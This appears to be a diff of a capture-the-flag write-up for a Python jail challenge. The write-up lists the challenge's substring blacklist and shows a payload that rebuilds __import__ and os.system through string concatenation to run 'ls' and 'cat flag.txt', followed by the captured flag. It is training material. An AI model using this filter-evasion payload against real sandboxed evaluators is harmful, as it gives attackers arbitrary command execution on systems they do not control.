@@ -38,12 +38,14 @@ os.execv(sys.executable, [sys.executable, "-c", code])
 
 
 ## Blacklist & Execution
-Blacklisted substrings: <span style="background-color: yellow">"os", "import", "flag", "system"</span>
+Blacklisted substrings: ```"os", "import", "flag", "system"</span>```
 
 
 The input is injected into a dynamically constructed string and executed via:
 
+```python
 python3 -c "<user_input>"
+```
 Any input containing blacklisted substrings gets rejected. Substring matching is used (if tool in hax), not full-word matching or regex. This makes it possible for "__import__" or even "syst" + "em" to be blocked, since "import" and "system" are substrings of those.
 
 
@@ -62,12 +64,12 @@ Use __builtins__ as a starting point to avoid using import directly.
 ``(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('ls')``
 
 Output:
-flag.txt
-run
+``flag.txt
+run``
 
 ### Step 2: Read the flag
-(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('cat 
-flag.txt')
+``(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('cat 
+flag.txt')``
 
 This bypasses the jail and prints the flag: CITU{th1s_1s_jus7_4n_ez_0n3_w4rd3n_1s_c4r3l3ss}
 
